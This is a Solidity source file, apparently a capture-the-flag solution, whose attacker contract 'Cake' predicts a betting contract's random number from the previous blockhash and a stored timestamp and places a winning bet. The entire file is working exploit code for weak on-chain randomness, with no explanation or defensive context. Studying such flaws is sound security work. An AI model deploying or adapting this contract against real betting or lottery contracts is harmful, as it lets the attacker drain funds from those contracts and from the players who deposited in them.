// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract BetFactory {
    function create () public payable {}
    function validate (uint) public {}
}

contract Bet {
    function bet (uint) public payable {}
    function getRandom () internal returns(uint) {}
}

contract Cake {
    address target;
    uint random_guess;
    uint pre_timestamp;
    
    function create (address _factory) public payable {
        BetFactory factory = BetFactory(_factory);
        factory.create{value: msg.value}();
        pre_timestamp = block.timestamp;
    }
    function validate (address _factory, uint token) public {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    }
    function run (address _target) public payable {
        target = _target;
        random_guess = uint(blockhash(block.number - 1)) ^ pre_timestamp;
        Bet instance = Bet(target);
        instance.bet{value: msg.value}(random_guess);
    }
    receive () external payable {}
}
